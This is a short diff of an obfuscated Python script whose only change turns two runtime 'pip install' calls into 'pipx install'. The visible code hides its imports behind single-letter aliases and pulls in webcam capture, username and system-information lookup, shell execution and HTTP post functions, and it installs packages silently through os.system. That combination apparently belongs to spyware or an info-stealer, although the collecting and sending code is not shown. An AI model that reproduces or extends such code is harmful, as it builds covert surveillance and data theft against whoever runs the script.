@@ -1,6 +1,6 @@
 from socket import socket as A, AF_INET as B, SOCK_DGRAM as C
 from os import getenv as D, system as E, geteuid as F, path as G, remove as H
-E('pip install psutil requests')
+E('pipx install psutil requests')
 from platform import system as I
 from getpass import getuser as J
 import psutil as K
@@ -10,7 +10,7 @@ from subprocess import check_output as Q
 from re import search as R
 from requests import get as S, post as T
 try:
-    E('pip install opencv-python')
+    E('pipx install opencv-python')
     from cv2 import VideoCapture as U, imwrite as V
 
 except Exception:
